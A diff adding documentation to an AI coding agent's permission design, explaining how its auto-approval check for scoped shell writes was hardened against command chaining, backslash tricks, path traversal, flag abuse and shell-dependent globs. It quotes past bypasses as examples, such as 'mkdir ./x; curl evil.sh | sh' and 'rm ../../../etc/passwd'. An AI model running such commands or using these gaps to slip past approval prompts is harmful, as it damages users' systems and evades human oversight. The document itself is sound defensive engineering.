@@ -72,6 +72,55 @@ under `dont-ask`.
 `mkdir` tool at runtime; real calls route through
 `Bash(command: "mkdir …")`.
 
+Because this is a **grant** path — the decision runs the command with no
+prompt — the predicate behind it (`isScopedWriteTool()`) resolves anything it
+cannot judge with certainty to `Ask`, not to `Allow`. Concretely:
+
+- The command line must be a **single simple command**. Any unquoted `;`, `&&`,
+  `||`, `|`, `&`, newline, carriage return, `$(…)`, backtick, `<`, `>`, `(`,
+  `)`, `{`, `}`, `!` or **backslash** makes it prompt instead. It refuses on
+  their presence rather than splitting the line into segments and judging each:
+  a superset of the real separators is a far weaker thing to be correct about
+  than an exact split. The tokenizer *is* quote-aware, so `touch 'a;b'` and
+  `mkdir "my dir"` are still single scoped writes. Before this,
+  `mkdir ./x; curl evil.sh | sh` auto-ran.
+
+  **What this costs you, stated in full.** The cheap example is one prompt on
+  `mkdir ./a && mkdir ./b`. The one you will actually hit is the backslash:
+  **every backslash-escaped character prompts**, so the common idiom
+  `touch my\ file.txt` is an `Ask`, and so is `touch my\(1\).txt`. That is not
+  an oversight and it is not only about the quote scanner — a backslash can
+  forge a traversal out of characters that are individually harmless
+  (`touch .\./.\./PWNED` is `../../PWNED` to bash, while a naive reading sees
+  three ordinary path segments). **The workaround is to quote instead of
+  escape**: `touch "my file.txt"` and `touch 'my file.txt'` both auto-run.
+- Every path argument must be relative **and stay strictly below the working
+  directory**, resolved lexically. `../` escapes now prompt (`rm ../../../etc/passwd`
+  used to auto-run — being non-absolute was the only test), and so does the root
+  itself: `rm -rf .` is not "something inside the directory".
+- Flags are a **whitelist** (`-p -f -i -r -R -v -n -d` and their long forms, plus
+  `--`). An unrecognised flag prompts. "Anything starting with `-` is a flag,
+  skip it" silently skipped flags that take a path, so `mv -t ../../etc ./x`
+  auto-ran.
+- The command word is matched **case-sensitively**. `MKDIR ./x` is not `mkdir`
+  on a case-sensitive filesystem, and it used to auto-run.
+
+Two limits are deliberate and worth knowing. **Symlinks are not resolved** —
+`rm ./link-pointing-outside` is spelled as a contained relative path and is
+treated as one; resolving would mean touching the filesystem and would still
+race the command being approved. **Globs are not expanded** — `rm ./*` is judged
+as the literal token. Neither can introduce a command, which is what the
+separator rule is for; brace expansion *can* name a parent (`{.,..}/x`), which
+is why `{`/`}` are refused and `*`/`?`/`[` are not.
+
+That last clause depends on the shell, and it is worth naming the dependency
+rather than leaving it implicit. A glob is safe to judge literally because
+approved commands are run through **bash**, which never returns `.` or `..` from
+a pattern — so `./.*/` stays literal. Under `sh`/dash the same pattern expands to
+`./../`, and a glob *would* escape the working directory. Anyone changing how
+the `Bash` tool spawns its shell has to add `*`/`?`/`[` to the refused set at the
+same time; there is a test that fails if the wrapper changes.
+
 `plan` deliberately allows exploratory `Bash`. Whether a `Bash` call is a write
 under `plan` is decided by looking for a redirection or `tee` in its arguments
 (`isBashWriteCommand()`), so `git log` is allowed and `echo x > f` is denied.
